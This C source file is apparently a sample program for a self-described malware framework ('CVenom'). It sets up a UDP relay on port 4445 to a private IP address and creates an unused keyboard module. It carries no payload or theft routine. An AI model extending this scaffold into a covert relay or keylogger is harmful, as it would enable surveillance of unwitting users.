#include "../CVenom.h"
#include "../MemoryTools.h"
#include "../NetworkTools.h"
#include "../KeyboardTools.h"

int main(MALWARE_ENTRY){
	cvinit(MALWARE_INIT);

	MemoryTools	Memory;
	KeyboardTools	Keyboard;
	NetworkTools	Network;

	MemoryBuffer Buffer = Memory.StackAllocate(100);

	Network.UDPServer("*", 4445);
	Network.UDPSetEndpoint("192.168.1.224", 4445);

	while(1){
		Network.UDPReceive(Buffer);
		Network.UDPSend(Buffer);
	}

	printf("%s\n", Buffer.data);

	cvexit(MALWARE_EXIT);
}
